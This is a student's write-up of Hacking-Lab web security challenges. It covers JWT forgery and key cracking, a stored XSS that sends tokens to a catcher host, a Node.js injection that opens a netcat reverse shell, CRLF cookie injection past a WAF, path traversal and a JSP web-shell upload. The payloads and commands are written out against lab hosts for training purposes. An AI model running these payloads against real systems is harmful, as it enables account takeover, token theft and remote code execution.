# SCHOGGI: JWT Vulnerability 1

- watched Request and Response of the `/api/account` via Burp Proxy
- used Repeater and changed JWT Algo to `None`
- by doing so we could iterate through the `uid` and `105` is an admin
- the signature is recalculated and replaced value inside the Storage in Firefox

```json
eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJqdGkiOiIxYTZkODhiZS0xMjFkLTQzYmEtODU1ZC1kMmZiZDgwNWY1OTYiLCJ1aWQiOjEwNSwiZXhwIjoxNzAzMDEwNDczfQ.
```

- after that we could access the profile page of the `admin victor`

# SCHOGGI: JWT Vulnerability 2

- watched Request and Response of the `/api/account` via Burp Proxy
- saved the JWT to a file and used `john` to get the _MAC Password_
- the result was that the _MAC Password_ is `pyramid`

```sh
> john --format=HMAC-SHA256 --wordlist=10-million-password-list-top-10000.txt lab08_challenge02_jwt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pyramid          (?)
1g 0:00:00:00 DONE (2023-12-20 07:00) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..lobo
```

- from there we used the _MAC Password_ and recalculated the JWT of the `uid=105` because we already know that this is an admin
- the signature is recalculated and replaced value inside the Storage in Firefox

```json
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIzMzcwNmFiMC0xNDg2LTQ4ZmYtOGE2Ni1kYzA4ODk0NmFhYjUiLCJ1aWQiOjEwNSwiZXhwIjoxNzAzMDU0MjUxfQ.4d7hSiOucVXb-yKkZjLUdtH_bm9Vim3wkaHdvo2bB9w
```

- after that we could access the admin page of the admin user `victor`

# SCHOGGI: Cross-Site Request Forgery (CSRF) with JSON

- attack.html + image

# SCHOGGI: CORS Misconfiguration (Level 1)

- attack2.html + image

# GlockenEmil 2.0 – JSON

- watched Request and Response of the `/api/product` via Burp Proxy
- tried to inject js code via the comments so that requests are sent to the catcher

```js
<script>
  fetch('https://1ff78333-e2ef-4a26-af65-62cd74e48e1b.idocker.vuln.land/abcd?token='+
  localStorage.getItem('token'))
</script>
```

- logged in as the second customer on another firefox instance
- accessed this url `https://1ed79c60-26f0-4d44-8900-87decba8c0e6.idocker.vuln.land/api/product/5aa0481e876d9d39d4397885` and the js code is being executed

```sh
QueryString:
b''
===================================================
URL: http://1ff78333-e2ef-4a26-af65-62cd74e48e1b.idocker.vuln.land/abcd?token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTcwMzEwMjY0NywiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.zpKRIcsS13fMCn2w6RkESxyNZJOyv0gvpR_bGp2ez64"
METHOD: GET
IP: 10.129.0.1
Time: 2023-12-20 20:34:22
Headers:
Host: 1ff78333-e2ef-4a26-af65-62cd74e48e1b.idocker.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Dnt: 1
Origin: https://1ed79c60-26f0-4d44-8900-87decba8c0e6.idocker.vuln.land
Referer: https://1ed79c60-26f0-4d44-8900-87decba8c0e6.idocker.vuln.land/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
X-Forwarded-For: 51.154.62.18
X-Forwarded-Host: 1ff78333-e2ef-4a26-af65-62cd74e48e1b.idocker.vuln.land
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: vm-docker-01.vuln.land
X-Real-Ip: 51.154.62.18


QueryString:
b'token=%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTcwMzEwMjY0NywiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.zpKRIcsS13fMCn2w6RkESxyNZJOyv0gvpR_bGp2ez64%22'
===================================================
```

# GlockenEmil 2.0 – RCE Remote Code Execution

- started listening with netcat on the web shell

```sh
nc -lvp 1337
```

- tried many variants to connect to the web shell via the website

```sh
From = require('child_process').exec('nc 10.131.0.4 1337 -e sh -i')
Quantity = 1
```

```sh
connect to [10.131.0.4] from tmp-glocken-emil-2-rce-db780a1b-b201-43b4-a75f-c89e59bcdfb1-1.tmp_default [10.131.0.3] 46379
```

- while connected to the interactive web shell we searched for the secret file

```sh
find ./ -type f | grep -rnw './' -e 'secret:'

./configs/index.js:22:        secret: 'kslafjop2)/)*(ZOJKN*K*JL*IU%*IO%JH'
```

# Peter Brown Website

- script does not check the file _path_ or the file _type_
- if the file `image` cannot be found then script returns the current directory path
- the script can be called from the browser and it just return any file it gets
- user `peterbrown` used a weak password

```sh
steven:019350074919e8b16136249e33c60a3bce643c85a7618e56ca83be7986e47a10X$xhhNgqEIdbVoXJd
lucy:e7e08d3198433df47d07245edfade7eb5f7921b67edc31ee868ea8fd634b5c15W$S6hQzOLI2vWtgm5
tom:4a0f3fb95c8d855b630cb43dbb5d5bf893d579adb6c54c15a8adfac8dc5a3032$K3aRH1AkSvBNGfw
garfield:9fbaa10591217928dfc67e982dc130eefa49bd86611ebb1e912400fab8b96995$doP0D4pXhSIp3Lw
peterbrown:61e2870f803df3706d16af40154831f99cf77dfddea08a553a2ce48bb9e7d482$gIZnu8AXeCa9IH
```

```sh
username: peterbrown
password: GarfieldStonehenge14
```

# Web App Firewall Bypass

- watched Request and Response of the `/login/Login.action` via Burp Proxy
- we can use the `url` of the POST body

```html
POST /login/Login.action HTTP/1.1 Host: login.vm.vuln.land User-Agent:
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type:
application/x-www-form-urlencoded Content-Length: 59 Origin:
http://login.vm.vuln.land Connection: close Referer:
http://login.vm.vuln.land/static/index1.html Cookie:
MOD_BUT=RqoWuWJhL8lIIiuLPyZuCMdMZpEAXI2d Upgrade-Insecure-Requests: 1
username=hacker10&url=%2Fsecure%2F&lang=EN&password=compass
```

- if use this now we can encode our request inside the `url`

```sh
/secure/
Set-Cookie: LOGON=ok
Set-Cookie: MOD_BUT_Username=admin

url encode:
%2Fsecure%2F%0D%0ASet%2DCookie%3A%20LOGON%3Dok%0D%0ASet%2DCookie%3A%20MOD%5FBUT%5FUsername%3Dadmin
```

- while in _intercept mode_ we can change the encoded `url` inside the POST body and we are forwarded to the admin page

```html
...
username=hacker10&url=%2Fsecure%2F%0D%0ASet%2DCookie%3A%20LOGON%3Dok%0D%0ASet%2DCookie%3A%20MOD%5FBUT%5FUsername%3Dadmin&lang=EN&password=compass
```

# PLUpload Challenge

- watched Request and Response of the `/upload` and `/download` via Burp Proxy
- if we want to download a non existing file we get an `500` error

```url
https://a6aaf4a3-afcc-4f0c-94a9-aa327db03331.idocker.vuln.land/Download?f=test
```

```java
java.io.FileNotFoundException: /var/tomcat/webapps/ROOT/uploadfile/test (No such file or directory)
 java.io.FileInputStream.open(Native Method)
 java.io.FileInputStream.<init>(FileInputStream.java:146)
 java.io.FileInputStream.<init>(FileInputStream.java:101)
 file.download.FileDownloadAction.doGet(FileDownloadAction.java:29)
 javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
 javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
```

- in the exception there is the full path of the directory where the uploaded files are stored
- based on that we tried to upload the `shell.jsp` script
- after the upload we can try to access it via the browser

```url
https://a6aaf4a3-afcc-4f0c-94a9-aa327db03331.idocker.vuln.land/uploadfile/shell.jsp
```

- navigated to the file `/var/gold.txt`

```sh
HL{New_is_always_better}
```
